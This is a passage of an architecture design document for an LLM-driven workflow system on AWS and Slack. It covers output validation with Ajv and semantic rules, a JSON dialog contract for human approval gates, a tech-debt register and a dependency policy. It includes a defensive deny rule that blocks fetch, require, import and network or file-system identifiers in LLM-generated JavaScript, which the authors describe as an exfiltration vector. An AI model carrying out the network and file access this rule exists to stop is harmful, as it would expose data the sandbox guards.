}
```

**Known error caught by Ajv today:**
The `check` constraint `expression` field — the LLM returned `"columns": ["quantity >= 0"]`
instead of `"expression": "quantity >= 0"`. Ajv would flag `expression` as required and missing
before any `createTable` call fires.

#### In-situ JS validation — `js_transform` steps

Used for `js_transform` steps where the LLM generates executable JavaScript.
There is no JSON Schema equivalent for arbitrary JS — two complementary gates are used instead.

**Scope constraint — synchronous transforms only:**
`js_transform` is restricted to pure synchronous data transformation — reshaping state,
extracting fields, merging objects, computing derived values. No async operations,
no I/O, no external API calls. The AST gate (Gate 1) enforces this by rejecting any
function containing `async`, `await`, `fetch`, `require`, or `import`.

External data enrichment from third-party APIs (e.g. Finnhub stock prices) is handled
by the `capability_call` step type — see Section 15 for the API Registry design.
This separation is intentional: arbitrary fetch in LLM-generated code is an
exfiltration vector that the capability registry eliminates by design.

**Why vm.runInNewContext timeout is sufficient for sync-only:**
Node.js `vm.runInNewContext({ timeout: N })` reliably kills synchronous infinite loops
because Node.js is single-threaded — the event loop cannot yield to the timed-out
context. This timeout does NOT apply to async operations, which is precisely why
async code is prohibited in js_transform and enforced at the AST gate before execution.

**Gate 1 — Static AST parse (acorn)**

Parse the generated JS using `acorn` before executing it. Reject if:
- Syntactically invalid
- Contains async/await keywords
- Contains fetch, require, or import expressions
- Contains network or file system identifiers

**Gate 2 — In-situ sandbox execution**

Run the generated function against a known test input using `vm.runInNewContext()` with a
hard timeout. Compare the output shape against `PGC_StepType.output_schema` for the
step type. If the function throws, times out, or returns the wrong shape — apply the
correction loop.

```js
import vm from 'node:vm';

const sandbox = { input: testInput };
const result  = vm.runInNewContext(generatedCode, sandbox, { timeout: 500 });
// validate result shape against PGC_StepType.output_schema
```

**Correction loop for JS (same 2-attempt ceiling):**

```
attempt 1
  AST parse → sandbox execute → validate output shape
  if valid   → pass to execution
  if invalid → log error (parse error / runtime error / shape mismatch)
             → inject error + stack trace into correction prompt
             → attempt 2

attempt 2
  AST parse → sandbox execute → validate output shape
  if valid   → pass to execution
  if invalid → write to PGC_Prompt.error_log → halt → error_recovery gate
```

#### Semantic validation rules — create_domain scaffold

Ajv validates JSON Schema shape (required fields, types, formats). It cannot validate
cross-field semantic contracts — rules that require reasoning across multiple fields
in the scaffold. These are enforced as a post-Ajv validation pass inside
`POST /proc/review-output` before any `createTable` call fires.

**Rule 1 — Every table must have the `set_updated_at()` trigger**

Every PGD table scaffold must include a trigger entry with
`"function": "set_updated_at()"` and `"timing": "BEFORE UPDATE"`.
If a table omits the trigger, `updated_at` will never be refreshed on row updates —
a silent data integrity failure that only surfaces when querying stale timestamps.

Validation check:
```js
for (const table of scaffold.tables) {
  const hasUpdatedAtTrigger = (table.triggers || []).some(
    t => t.function === 'set_updated_at()' && t.timing === 'BEFORE UPDATE'
  );
  if (!hasUpdatedAtTrigger) {
    errors.push(`Table "${table.tableName}" is missing the set_updated_at() trigger`);
  }
}
```

**Rule 2 — upsert_key columns must have a matching UNIQUE constraint**

If the LLM populates `upsert_key` in `PGC_EntitySchema` with a column name, the same
column must appear in a `UNIQUE` constraint in the corresponding table's `constraints[]`.
Without the constraint, `INSERT ... ON CONFLICT` will fail at runtime with a PostgreSQL
error — the `upsert_key` entry in `PGC_EntitySchema` would be a lie.

This rule applies at the entity registration step, not the DDL step. Validation check:
```js
for (const entity of scaffold.entities || []) {
  for (const keyCol of entity.upsert_key || []) {
    const table    = scaffold.tables.find(t => t.tableName === entity.root_table);
    const hasConst = (table?.constraints || []).some(
      c => c.type === 'unique' && (c.columns || []).includes(keyCol)
    );
    if (!hasConst) {
      errors.push(
        `Entity "${entity.entity_name}" upsert_key column "${keyCol}" ` +
        `has no matching UNIQUE constraint on "${entity.root_table}"`
      );
    }
  }
}
```

**Rule 3 — Foreign key parent tables must exist in the same scaffold**

If a table references another table via a foreign key, the referenced table must either
exist in the current scaffold or already be registered in `PGC_Schema`. Cross-domain
foreign keys are not permitted — all tables in a domain are created together.

**Enforcement model:**

These three rules fire as a named validation pass after Ajv, before any SERV call.
Failures use the same 2-attempt correction loop — errors are injected into the
correction prompt and logged to `PGC_Prompt.error_log` with
`"error_type": "semantic_validation"`. The correction prompt names the specific rule
and the offending table/entity so the LLM can fix the exact field without regenerating
the entire scaffold.

#### Where this runs

Validation runs inside the Step Processor (`POST /proc/run-workflow`) immediately after
receiving LLM output, before writing to `local_state` or advancing the stack.
It is not a separate Lambda or endpoint — it is a synchronous in-process call
within the step execution loop. The 2-attempt ceiling includes the cost of both LLM calls
in the step's `duration_ms` logged to `PGC_WorkflowRunStep`.

#### Relationship to right-brain architecture

This section is the first concrete implementation of the right-brain feedback loop.
`PGC_Prompt.error_log` accumulates structured evidence of where each prompt fails.
A future `POST /proc/improve-prompt` endpoint reads this log and generates an improved
prompt version — the self-evolution loop. The validation layer is what makes that loop
meaningful: without it, failures are either silent or surface as DDL errors with no
structured context to learn from.


---

### 6.11 UI Dialog Contract — WORKFLOW_GATE Message

#### Purpose

When the Step Processor hits a `human_gate` step it must communicate to the
Experience tier what the user needs to see and respond to. This communication
must be UI-agnostic — the PROC layer has no knowledge of Slack Block Kit,
Teams Adaptive Cards, or any other UI framework. The Experience tier
translates the contract into whatever format its medium requires.

This section defines that contract: the `WORKFLOW_GATE` SQS message shape,
the `dialog` field type system, and the enforcement model.

#### Design decisions — final

**UI-neutral field types grounded in standard component vocabulary.**
Field type names are taken from Material UI (React) and Angular Material —
the two dominant component libraries — so that any frontend developer
immediately understands the rendering intent without reading documentation.

**Plain text only in workflow definitions.**
`message_template` and option `label` fields in `PGC_Workflow.steps` contain
plain text only — no Slack `mrkdwn`, no emoji, no markdown. The Experience
tier adds all formatting, emoji, and markup appropriate to its medium.
A Slack renderer adds `*bold*` and emoji. A Teams renderer adds Adaptive Card
formatting. A CLI renderer adds nothing. The workflow definition is the same
in all cases.

**`style` hints are retained in the contract.**
`style: "primary" | "danger" | "default"` appears on buttons and per-row
actions. It is a semantic hint about visual weight and intent, not a Slack
colour instruction. Material UI uses `color="error"`, Slack uses
`style: "danger"`, a CLI might render it in red. The hint travels in the
contract; each renderer maps it appropriately. Renderers are free to ignore it.

**`secondaryAction` is a single action per list item.**
Material UI `ListItem` has one `secondaryAction` slot. Angular Material
`mat-list-item` has one action slot. Our contract mirrors this — one optional
action per row. If multiple per-row actions are ever needed (edit + delete),
the renderer wraps them; the contract field becomes an array at that point
(Phase 3 decision).

**`confirm` is a plain string.**
A confirmation prompt before a destructive action. The renderer decides how
to present it — Slack uses a confirmation dialog modal, a web UI uses
`window.confirm()`, a CLI prompts inline. Plain string is sufficient today;
a structured `{ title, message }` object is Phase 3 when modal dialogs need
separate title and body.

**`step` keys in `PGC_Workflow.steps` are strings throughout.**
Mixed integer/string keys (`3` vs `"3b"`) create lookup ambiguity in the
Step Processor. All step keys are strings: `"1"`, `"2"`, `"3"`, `"3b"`.
Stored as-is in the jsonb array; the Step Processor indexes by string key.

#### WORKFLOW_GATE SQS message

Enqueued by the Step Processor to `SYSSQSSlackResults` when a `human_gate`
step is reached. Consumed by `SlackCallbackListenerFunction` (`callback.mjs`).

`gate_type` in this message is the primitive type from the step definition
(`"edit_list"`, `"confirm"`, etc.) — never a domain-specific value like
`"review_tables"`. `callback.mjs` uses `gate_type` only as a layout hint
(e.g. whether to use `chat.update` in-place or post a new thread message).
All rendering information is in the `dialog` object.

```json
{
  "type":          "WORKFLOW_GATE",
  "workflowRunId": 42,
  "gate_type":     "edit_list",
  "dialog": {
    "title": "Review domain plan",
    "fields": [ ...fully resolved field objects... ]
  },
  "callback": { "provider": "slack", "channel": "C0AEJ87JSKF", "threadId": "..." },
  "traceId": "uuid"
}
```

The `dialog` is fully resolved before enqueuing — all `{{variable}}`
substitutions applied, all `items_key` arrays expanded to concrete `items`
arrays, all `item_action.condition` expressions evaluated per row.
`callback.mjs` receives a ready-to-render structure with no unresolved paths.

#### Dialog field type system

The `dialog.fields` array is an ordered list of field objects. Each has a
`type` that maps directly to a standard UI component.

**`typography`** — read-only display text. No user interaction.
Equivalent to `<p>` / MUI `Typography` / Angular `mat-hint`.
```json
{ "type": "typography", "value": "Here's my plan for domain recipes." }
```

**`textbox`** — single-line free text input.
Equivalent to `<input type="text">` / MUI `TextField` / `mat-form-field input`.
```json
{ "type": "textbox", "name": "table_description", "label": "Describe the new table", "placeholder": "e.g. stores daily stock prices", "required": true }
```

**`textarea`** — multi-line free text input.
Equivalent to `<textarea>` / MUI `TextField multiline` / `mat-form-field textarea`.
```json
{ "type": "textarea", "name": "instructions", "label": "Cooking instructions", "required": false }
```

**`radio`** — mutually exclusive single selection from a fixed set.
Equivalent to `<input type="radio">` / MUI `RadioGroup` / `mat-radio-group`.
```json
{
  "type": "radio",
  "name": "table_choice",
  "label": "Select a table",
  "options": [
    { "value": "PGD_Recipes",     "label": "Recipes" },
    { "value": "PGD_Ingredients", "label": "Ingredients" }
  ]
}
```

**`select`** — single selection from a drop-down list. Use when the option
set is too long for radio buttons (more than ~5 items).
Equivalent to `<select>` / MUI `Select` / `mat-select`.
```json
{
  "type": "select",
  "name": "difficulty",
  "label": "Difficulty",
  "options": [
    { "value": "easy",   "label": "Easy" },
    { "value": "medium", "label": "Medium" },
    { "value": "hard",   "label": "Hard" }
  ]
}
```

**`checkbox`** — multi-select from a fixed set. Zero or more values.
Equivalent to `<input type="checkbox">` group / MUI `Checkbox` group /
`mat-checkbox` group.
```json
{
  "type": "checkbox",
  "name": "selected_tables",
  "label": "Select tables to include",
  "options": [
    { "value": "PGD_Recipes",     "label": "Recipes" },
    { "value": "PGD_Ingredients", "label": "Ingredients" }
  ]
}
```

**`list`** — a vertical stack of items, each with a primary label, optional
secondary text, and an optional single inline action button.
Equivalent to MUI `List` + `ListItem` with `secondaryAction` /
Angular Material `mat-list` + `mat-list-item` with action slot.

Use when displaying a collection of named items where the user may act on
individual items (remove, select, edit). Not a table — no column headers,
no sortable columns. If tabular structure is needed, use `table` (Phase 3).

```json
{
  "type": "list",
  "name": "tables",
  "label": "Domain recipes — 3 tables selected",
  "items": [
    {
      "id": "PGD_Recipes",
      "primary": "PGD_Recipes",
      "secondary": "name, description, prep_time_minutes",
      "secondaryAction": null
    },
    {
      "id": "PGD_RecipeIngredients",
      "primary": "PGD_RecipeIngredients",
      "secondary": "recipe_id, ingredient_id, quantity",
      "secondaryAction": {
        "action": "remove_table",
        "label": "Remove",
        "style": "danger",
        "confirm": "Remove PGD_RecipeIngredients from this domain?"
      }
    }
  ]
}
```

`secondaryAction: null` means no action for this item (e.g. a parent table
that cannot be removed while child tables reference it). The renderer omits
the button entirely — it does not render a disabled button.

**`actions`** — the form's submit/dismiss buttons. Always the last field in
`dialog.fields`. Equivalent to a `<div>` of `<button>` elements /
MUI `Button` group / `mat-button` group.
```json
{
  "type": "actions",
  "buttons": [
    { "action": "confirm", "label": "Looks good", "style": "primary" },
    { "action": "cancel",  "label": "Cancel",     "style": "default" }
  ]
}
```

`action` is the value the Step Processor receives in `userResponse` when
the user clicks this button. `label` is plain text — no emoji, no markup.

#### Intent-based human_gate steps — FINAL

`human_gate` step definitions express **intent**, not UI structure. The LLM
designing a workflow declares what kind of interaction is needed and what data
to bind — the Step Processor translates that intent into a concrete
`WORKFLOW_GATE` dialog at runtime.

**Three layers of translation:**

```
PGC_Workflow.steps  →  Step Processor  →  WORKFLOW_GATE  →  callback.mjs
(intent)               (translation)      (concrete dialog)  (rendering)
```

1. The LLM produces intent: `gate_type` + binding metadata + `message_template` + `options`
2. The Step Processor translates intent to a concrete `dialog` object using a
   `buildDialog()` handler keyed on `gate_type`
3. `callback.mjs` renders the `dialog` as Slack Block Kit (or any other UI format)

**Why `gate_type` is correct here:** the set of primitive dialog styles is
finite and bounded by what `callback.mjs` can render. An LLM cannot invent a
`gate_type` the Step Processor doesn't know how to translate —
`workflow_steps.schema.json` enforces `gate_type` as an enum. This is
intentionally different from arbitrary `js_transform` — dialog styles are
a closed set, not open-ended code.

#### Primitive gate_type catalogue

Six primitive types cover all human interaction patterns:

| gate_type | Interaction | Dialog produced by Step Processor |
|---|---|---|
| `confirm` | Read a proposal, accept or reject | `typography` + `actions` |
| `select_one` | Pick exactly one item from a list | `typography` + `radio` or `select` + `actions` |
| `select_many` | Pick zero or more items | `typography` + `checkbox` + `actions` |
| `edit_list` | View a collection, optionally remove items, confirm | `typography` + `list` with per-row actions + `actions` |
| `text_input` | Provide free text | `typography` + `textbox` + `actions` |
| `review_object` | Review a structured summary, accept or reject | `typography` + structured summary + `actions` |

These types are UI-primitive — they map to standard component patterns
(MUI / Angular Material) and are independent of any workflow domain.
`edit_list` is used wherever a user needs to remove items from a collection,
regardless of whether those items are tables, ingredients, workflow steps,
or anything else.

#### Data preparation pattern — js_transform before human_gate

`item_secondary_key` (and `item_primary_key`) must be real fields on each item
in the `context_key` array at the time the gate executes. The Step Processor
does a plain field lookup — `item[item_secondary_key]` — with no derivation.

If the display field does not exist on the raw data (e.g. a `columnSummary`
string derived from a `columns` array), a `js_transform` step must precede
the gate to enrich the data. The LLM designing a workflow is responsible for
inserting this step — it is not an implicit Step Processor behaviour.

**Example:** the `create_domain` `edit_list` gate needs `columnSummary` per
table. The LLM scaffold produces `columns: [{ name, type, ... }]`. Step 2
(`js_transform`) filters system columns (`id`, `created_at`, `updated_at`),
takes the first 4 remaining names, and writes `columnSummary` back onto each
table object in `proposed_scaffold.tables`. Step 3 (`edit_list` gate) then
reads `item_secondary_key: "columnSummary"` as a plain field lookup.

This pattern is general: any `human_gate` that needs a derived or formatted
display field must be preceded by a `js_transform` that produces it. The
`create_workflow` LLM prompt documents this requirement explicitly.

#### human_gate step fields

```json
{
  "step": "3",
  "type": "human_gate",
  "gate_type": "edit_list",
  "description": "User reviews proposed table list. Child tables may be removed.",
  "message_template": "Here's my plan for domain {{proposed_scaffold.domain}}. You can remove any child tables you don't need.",
  "context_key": "proposed_scaffold.tables",
  "item_primary_key": "tableName",
  "item_secondary_key": "columnSummary",
  "item_action": {
    "condition": "item.foreignKeys.length > 0",
    "action": "remove_item",
    "action_data_key": "tableName",
    "confirm_template": "Remove {{item.tableName}} from this domain?"
  },
  "options": [
    { "label": "Looks good", "action": "confirm", "on_select": "next" },
    { "label": "Cancel",     "action": "cancel",  "on_select": "cancel" }
  ],
  "on_success": "next",
  "on_failure": "cancel"
}
```

`columnSummary` exists on each item because Step 2 (`js_transform`) added it.
Without that step this gate would render empty secondary text.

#### Full dialog field type reference

This is the complete catalogue of field types the Step Processor produces in
`WORKFLOW_GATE` messages and `callback.mjs` must render. This catalogue is
the reference when writing the `create_workflow` LLM prompt and when building
`workflow_steps.schema.json`.

**`typography`** — read-only text. No user interaction.
`<p>` / MUI `Typography` / Angular `mat-hint`.
```json
{ "type": "typography", "value": "Here's my plan for domain recipes." }
```

**`textbox`** — single-line text input.
`<input type="text">` / MUI `TextField` / `mat-form-field input`.
```json
{ "type": "textbox", "name": "new_table_description", "label": "Describe the new table", "placeholder": "e.g. stores daily stock prices", "required": true }
```

**`textarea`** — multi-line text input.
`<textarea>` / MUI `TextField multiline` / `mat-form-field textarea`.
```json
{ "type": "textarea", "name": "notes", "label": "Additional notes", "required": false }
```

**`radio`** — mutually exclusive single selection. Use for ≤5 options.
`<input type="radio">` / MUI `RadioGroup` / `mat-radio-group`.
```json
{
  "type": "radio",
  "name": "table_choice",
  "label": "Select a table",
  "options": [
    { "value": "PGD_Recipes",     "label": "Recipes" },
    { "value": "PGD_Ingredients", "label": "Ingredients" }
  ]
}
```

**`select`** — single selection drop-down. Use for >5 options.
`<select>` / MUI `Select` / `mat-select`.
```json
{
  "type": "select",
  "name": "difficulty",
  "label": "Difficulty",
  "options": [
    { "value": "easy",   "label": "Easy" },
    { "value": "medium", "label": "Medium" },
    { "value": "hard",   "label": "Hard" }
  ]
}
```

**`checkbox`** — multi-select, zero or more values.
`<input type="checkbox">` group / MUI `Checkbox` group / `mat-checkbox` group.
```json
{
  "type": "checkbox",
  "name": "features",
  "label": "Select features to include",
  "options": [
    { "value": "tags",    "label": "Tags" },
    { "value": "ratings", "label": "Ratings" }
  ]
}
```

**`list`** — vertical stack of items, each with primary label, optional
secondary text, and an optional single inline action button.
MUI `List` + `ListItem` with `secondaryAction` /
Angular `mat-list` + `mat-list-item` with action slot.
`secondaryAction: null` — renderer omits the button entirely for that row.
```json
{
  "type": "list",
  "name": "tables",
  "label": "3 tables selected",
  "items": [
    {
      "id": "PGD_Recipes",
      "primary": "PGD_Recipes",
      "secondary": "name, description, prep_time_minutes",
      "secondaryAction": null
    },
    {
      "id": "PGD_RecipeIngredients",
      "primary": "PGD_RecipeIngredients",
      "secondary": "recipe_id, ingredient_id, quantity",
      "secondaryAction": {
        "action": "remove_item",
        "label": "Remove",
        "style": "danger",
        "confirm": "Remove PGD_RecipeIngredients from this domain?"
      }
    }
  ]
}
```

**`actions`** — form submit/dismiss buttons. Always the last field in a dialog.
MUI `Button` group / `mat-button` group.
`action` is the `userResponse` value received by the Step Processor.
`label` is plain text only — no emoji, no markup.
```json
{
  "type": "actions",
  "buttons": [
    { "action": "confirm", "label": "Looks good", "style": "primary" },
    { "action": "cancel",  "label": "Cancel",     "style": "default" }
  ]
}
```

**`style` hint values:** `"primary"` | `"danger"` | `"default"`.
Renderers map to their medium: Slack `style: "danger"`, MUI `color="error"`,
CLI red text. Renderers may ignore the hint.

#### Domain design constraint — primary table + child tables

When the LLM designs a new domain via `create_domain`, it must produce exactly
one primary (root) table with no foreign key references, and zero or more child
tables that reference the primary table via FK. Cross-domain foreign keys are
not permitted. This constraint is enforced in `review-output.mjs` semantic
rules and in the `create_domain` prompt.

**Rationale:** a single primary table per domain keeps the entity model simple,
makes the `edit_list` gate straightforward (Remove is safe on any child
table — condition `item.foreignKeys.length > 0` naturally excludes the primary),
and ensures SERV-Entity always has a clear `root_table`. Multi-root domains
are Phase 3 when the entity model is extended.

This constraint is documented in the `create_domain` prompt text and validated
by semantic Rule 3 (FK parent tables must exist in the scaffold). A scaffold
with two tables that have no FK relationship between them fails validation —
it implies two roots, which is not permitted.

#### Enforcement model — schema sources

All JSON Schema definitions used for LLM output validation are stored in
`PGC_Prompt.output_schema` alongside the prompt that produced them. The schema
evolves with the prompt version. `review-output.mjs` fetches both together.
No separate `contracts/` directory is needed — there are no schemas that
belong outside the DB.

**Schema locations:**

| Schema | Lives in | Used by |
|---|---|---|
| `create_domain_scaffold` | `PGC_Prompt.output_schema` (intent: `create_domain`) | `review-output.mjs` after Step 1 `llm_call` |
| `workflow_steps` | `PGC_Prompt.output_schema` (intent: `create_workflow`) | `review-output.mjs` after `create_workflow` LLM call |
| `merge_tables_scaffold` | `PGC_Prompt.output_schema` (intent: `merge_tables`) | `review-output.mjs` after Step 3b `llm_call` |
| `design_table_scaffold` | `PGC_Prompt.output_schema` (intent: `design_table`) | `review-output.mjs` after Step 4b `llm_call` |

The `workflow_steps` schema includes the full `dialog` field type definitions
inline as `$ref` definitions — it is the authoritative reference for what a
valid `human_gate` dialog looks like. When the `create_workflow` LLM generates
a new workflow, `review-output.mjs` validates the entire `steps` array
including all inline `dialog` objects against this schema.

The Step Processor does not self-validate its dialog output with Ajv. It builds
the dialog from deterministic code (`buildDialog()`) and relies on the Slack API
to reject malformed payloads. A `callback.mjs` rendering error is a cleaner
failure signal for a code bug than a silent Ajv pass. Ajv validation of
self-built output is deferred until the Step Processor is production-stable.

**Rule:** all schemas live in `PGC_Prompt.output_schema`. If a schema validates
LLM output, it belongs there versioned with the prompt. The `workflow_steps`
schema is the one that embeds the dialog field type definitions — keeping
the dialog contract co-located with the workflow structure contract that
references it.

---

## 7. Tech Debt Register

| Item | Priority | Notes |
|---|---|---|
| Workflow safety guards (velocity detector, execution accumulator, cycle detector) | High | Required before Step Processor is production-ready — see Section 6.9. Right-brain can monitor `PGC_WorkflowStats` for anomalous run patterns and flag suspect workflows proactively |
| Semantic validation rules for create_domain scaffold | ~~High~~ | ✅ Implemented in `src/proc/review-output.mjs` — all three rules enforced in `runSemanticRules()` |
| `resume_gate` routes to HELP workflow only | ~~High~~ | ✅ Resolved — Step Processor dispatches generically via `run-workflow.mjs dispatchSqs()`. No per-workflow routing in handler |
| `create-domain.mjs` ignores scaffold from design-domain and calls LLM again | ~~High~~ | ✅ Resolved — Step Processor drives `create_domain` declaratively from `PGC_Workflow.steps` |
| Gate re-renders post new Slack messages instead of `chat.update` in-place | ~~Medium~~ | ✅ Resolved — `message_ts` threaded through SQS → `run-workflow.mjs` → `WORKFLOW_GATE` → `callback.mjs` `chat.update` |
| Duplicate domain detection — LLM runs every time | High | `/create-domain recipes` re-runs the LLM even if the domain already exists, producing different tables each run due to LLM variance. Correct fix: add a `serv_query` pre-check step to `create_domain` workflow before the `llm_call` — if domain already exists in `PGC_DomainHelp`, load existing schema from `PGC_Schema` and skip LLM entirely. This is the "LLM called only once per novel intent" principle. Blocked on `serv_query` step type (Phase 3). Right-brain can also detect repeated identical intents via `PGC_WorkflowStats` and short-circuit proactively |
| `create_domain` prompt produces varying schemas — right-brain fix needed | Medium | LLM variance at `temperature: 0.2` produces inconsistent domain schemas across runs (e.g. recipe steps table present on some runs, absent on others). Short-term defensive option: make prompt more prescriptive per domain type. Correct fix: right-brain prompt evolution — `PGC_WorkflowStats` accumulates run data, right-brain analyses `PGC_Prompt.error_log` and `output_sample` to detect schema variance, and generates an improved prompt version. Do not invest in defensive patching before the feedback loop exists — patching symptoms is the wrong investment when the right-brain architecture already has the scaffolding (`PGC_Prompt.output_sample`, `PGC_Prompt.error_log`, `PGC_WorkflowStats`) to solve this correctly |
| `create_domain` prompt produces varying schemas across runs | Medium | LLM variance at `temperature: 0.2` — e.g. recipe steps table omitted on some runs. Defensive fix: more prescriptive prompt. Correct fix: right-brain prompt evolution via `PGC_WorkflowStats` + `PGC_Prompt.error_log`. Do not invest in defensive patching before the feedback loop exists |
| `js_transform` built-in `columnSummary` only | Medium | Generic sandboxed JS (acorn AST gate + `vm.runInNewContext`) not implemented. All `js_transform` steps currently require a registered built-in. Blocked on Phase 3 JS sandbox |
| `PGC_WorkflowRunStep` idempotency uses `parseInt(stepNumber)` | Medium | String step keys like `"3b"` resolve to `0` — idempotency check will be incorrect when branch/conditional steps with string keys are introduced. Fix when `condition` step type is implemented |
| `created_tables_summary` hardcoded in iterator | Low | Iterator completion in `run-workflow.mjs` writes `created_tables_summary` via a domain-specific string. Should be generic — driven by step definition |
| `domain: null` on DDL-created tables | Medium | `PGC_Schema` and `PGC_TableMap` rows inserted by the DDL iterator have `domain: null`. Domain name needs to be threaded through `serv_schema` step input. Fix in next `create_domain` workflow version |
| `design-domain.mjs` dead code | Low | No longer receives traffic since Step Processor took over. Remove in next cleanup pass |
| `createTable` DDL + PGC_Schema insert not in a transaction | Medium | Physical table can exist without registry row on partial failure |
| Orphan table cleanup tooling | Low | Failed partial runs leave orphan tables in PGC_Schema — `delete-domain` covers full domains; per-table orphan cleanup is manual |
| AWS infrastructure cost — Bastion Host public IPv4 | Low | EC2 Bastion accrues ~$2.82/month in public IPv4 charges. Replace with AWS SSM Session Manager when promotional credits near exhaustion. No application code changes needed |
| W3C `traceparent` format for `traceId` | Low | Adopt `{version}-{traceId}-{parentId}-{flags}` when observability tooling added |
| `updateTable` ALTER TABLE | Medium | Currently metadata only — does not execute ALTER TABLE |
| Unit tests | Medium | Test pure functions first: `buildCreateTableSQL`, `validateCreatePayload`, `parseEvent`, `resolveTemplate`, `evalItemCondition`. Use `node:test` built-in |
| Integration tests | Low | Defer until intent pipeline complete — use `testcontainers` + PostgreSQL |
| CI/CD GitHub Actions | Low | Deliberately deferred until `template.yaml` stabilises — options: GitHub Actions on push to main, SAM pipeline, CodePipeline |
| Dependency injection for DB clients | Medium | Needed for unit testability — clients currently instantiated at module level |
| PROC/SERV API Gateway resource policy | Medium | Restrict to AWS account-scoped requests before any public exposure — see Section 12.3 |
| Refactor `proc/create-domain.mjs` private `servFetch` + `callLlm` | ~~Low~~ | ✅ Resolved — extracted to `src/shared/serv-client.mjs` and `src/shared/llm-client.mjs` |
| `callback` routing pattern not enforced at compile time | Low | Every PROC endpoint reading callback from SQS must use `req.callback ?? req.body?.callback ?? null`. Currently convention only — caught at runtime. Add a lint rule or helper function when unit tests are added |
| Terraform state — legacy infrastructure | Low | Terraform config in `terraform-aws/` predates SAM migration. Check for orphaned AWS resources not tracked by SAM before decommissioning. Run `terraform state list` and reconcile against `template.yaml` |
| Azure MSAL token utility (`src/lib/getAccessToken.js`) | Low | Vercel-era artifact. May be part of a Microsoft Graph / Teams integration. Assess for Teams Experience tier or decommission. Azure app credentials may still be active |
| `upsert-workflow.mjs` required on fresh deploys | Low | `help` workflow is in `seed_PGC_Workflow.json` but `init-brain` uses `ON CONFLICT DO NOTHING` — a fresh deploy will not update the steps if the row already exists. Must run `upsert-workflow.mjs help` after any workflow step changes |
| `create_workflow` workflow steps empty | Low | `PGC_Workflow` row for `create_workflow` has `steps: []` — stub only. Full implementation is Phase 3 |

---

## 7a. Dependency Policy

Every npm dependency added to this project must be evaluated against the following
criteria before merging. A one-line registry entry is required in the table below.

### Evaluation criteria

**1. Download volume** — npm weekly downloads. Floor: 1M+/week for production use.
High download count indicates broad ecosystem adoption and active maintenance pressure.

**2. Maintenance cadence** — last publish date and open GitHub issues.
No commits in 2+ years or unresolved security issues is a blocking concern.

**3. Single-purpose** — prefer libraries that do one thing well.
Frameworks that want to own architecture (ORMs, HTTP frameworks, full validators)
are a poor fit — they duplicate existing SERV/PROC abstractions and add upgrade risk.

**4. Dependency footprint** — run `npm ls <package>` before installing.
Each transitive dependency is an additional attack surface and upgrade obligation.
For Lambda, it also affects cold start time and bundle size. Reject if >20 transitive deps
without compelling justification.

**5. License** — must be MIT, Apache 2.0, or BSD.
GPL/LGPL creates licensing complications for the AGPL-3.0 project.
Check `license` field in the package's `package.json`.

**6. Security record** — run `npm audit` after install.
Any high/critical CVE in the package or its transitive deps blocks the addition
unless a patch is available and pinned.

### What to avoid for this project

- **ORMs** (Prisma, Sequelize, TypeORM) — SERV is the DB abstraction layer. An ORM
  duplicates PGC_TableMap gating and fights the three-tier design.
- **HTTP frameworks** (Express, Fastify, Hapi) — API Gateway + `parseEvent` already
  handles routing. A framework adds cold start weight with no benefit.
- **Duplicate validators** (Zod, Yup) — `ajv` is the chosen validator. One is enough.
- **Any package with >20 transitive deps** without documented justification.

### Approved dependency registry

| Package | Version | Weekly DL | License | Purpose | Added |
|---|---|---|---|---|---|
| `pg` | ^8 | ~3M | MIT | PostgreSQL client — PGC + PGD connections in ServFunction | bootstrap |
| `@aws-sdk/client-sqs` | ^3 | ~5M | Apache-2.0 | SQS SendMessage — WorkflowQueue + SlackResultsQueue | bootstrap |
| `@slack/web-api` | ^7 | ~1M | MIT | Slack API — chat.postMessage, chat.update, Block Kit | bootstrap |
| `ajv` | ^8 | ~100M | MIT | JSON Schema validation — right-brain output validation loop | v3.2-design-domain-foundation |

### Candidates approved for future addition

| Package | Weekly DL | License | Purpose | When |
|---|---|---|---|---|
| `acorn` | ~50M | MIT | AST parser for `js_transform` sandbox gate (Section 6.10) | Phase 2 item 3a JS validation |
| `ajv-formats` | ~20M | MIT | Adds `date-time`, `uuid` format validators to Ajv | When output schemas use format keywords |

---

| Tag | What was completed |
|---|---|
| `v3.2-scaffolding-complete` | All 5 pings pass (ping-api, ping-llm, ping-sqs, ping-db, ping-e2e) |
| `v3.2-ping-complete` | ping-sqs threading fixed, ping-e2e full round trip with RDS version string |
| `v3.2-serv-schema-complete` | SERV-Schema all CRUD endpoints, init-brain bootstrap, 4 PGC system tables |
| `v3.2-pgc-workflow-tables-complete` | 10 PGC system tables bootstrapped and seeded |
| `v3.2-callback-abstraction-complete` | Generic callback object, SYSSQSCallbackResults queue rename |
| `v3.2-serv-table-partial` | SERV-Table getRows + insertRow, wired into serv handler |
| `v3.2-create-domain-scaffold` | /create-domain end to end with hardcoded recipes scaffold |
| `v3.2-create-domain-live-llm` | /create-domain live LLM via Perplexity Agent API + json_schema output |
| `v3.2-r14-r15-complete` | FK/constraint normalisation moved to SERV layer; response_format restored on LLM call |
| `v3.2-slack-signing-complete` | Slack signing secret verification added to SlackbotFunction handler |
| `v3.2-template-cleanup` | SchemaQueue + DLQ removed, LambdaInvokePolicy removed, stale env vars cleaned |
| `v3.2-clean-baseline` | All pings passing, Lambda invoke pattern fully gone, clean foundation for Phase 2 |
| `v3.2-interactive-complete` | /interactive endpoint live, /help command proves full interactive loop end-to-end |
| `v3.2-serv-table-complete` | SERV-Table updateRows + deleteRows complete. openapi.yaml v3.3.2 |
| `v3.2-shutdown-complete` | /shutdown command — SlackbotFunction + ProcFunction, ephemeral Slack response |
| `v3.2-serv-entity-complete` | SERV-Entity all six routes complete. PGC_EntitySchema upsert_key added. openapi.yaml v3.3.3 |
| `v3.2-bootstrap-clean` | init-brain installs set_updated_at() on PGD. seed_PGC_Schema upsert_key synced |
| `v3.2-architecture-semantic-validation` | Semantic validation rules documented in Section 6.10. Tech debt entry added |
| `v3.2-design-domain-foundation` | shared/llm-client + shared/serv-client extracted. proc/review-output (Ajv + semantic rules). proc/design-domain first pass (LLM + validation + WorkflowRun lifecycle). openapi.yaml v3.3.4 |
| `v3.2-design-domain-e2e` | callback routing fix (req.callback not req.body.callback). callback.mjs DESIGN_DOMAIN_RESULT + DESIGN_DOMAIN_ERROR handlers. Full Slack flow confirmed end-to-end |
| `v3.2-refactor-complete` | Phase 1 refactoring closed out. All pings passing. v3.2-clean-baseline re-tagged |
| `v3.2-design-domain-gate-complete` | proc/design-domain Block Kit review gate + in-place remove. human_gate suspend/resume wired |
